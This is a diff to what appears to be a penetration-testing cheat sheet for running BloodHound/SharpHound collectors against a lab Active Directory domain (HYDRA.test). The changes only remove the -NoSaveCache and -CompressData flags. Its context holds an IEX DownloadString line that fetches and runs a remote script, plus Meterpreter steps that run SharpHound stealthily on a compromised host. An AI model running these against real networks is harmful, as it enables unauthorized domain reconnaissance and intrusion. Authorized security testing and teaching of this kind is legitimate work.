@@ -41,13 +41,13 @@ IEX (New-Object Net.Webclient).DownloadString("$HTTP_URL_TO_SCRIPT"); $BLOODHOUN
 Execute the collector script.
 
 ```powershell
-Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData # HYDRA.test
+Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth # HYDRA.test
 ```
 
 **Target Machine, C# Collector**:
 
 ```powershell
-.\SharpHound.exe --CollectionMethod All --Domain $DOMAIN --Stealth --NoSaveCache --CompressData # HYDRA.test
+.\SharpHound.exe --CollectionMethod All --Domain $DOMAIN --Stealth --NoSaveCache # HYDRA.test
 ```
 
 **Meterpreter/PowerShell on Target Machine**:
@@ -55,7 +55,7 @@ Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -C
 ```powershell
 meterpreter > use powershell
 meterpreter > powershell_import $PATH_TO_SHARPHOUND_PS1
-meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData" # HYDRA.test
+meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache" # HYDRA.test
 ```
 
 ---
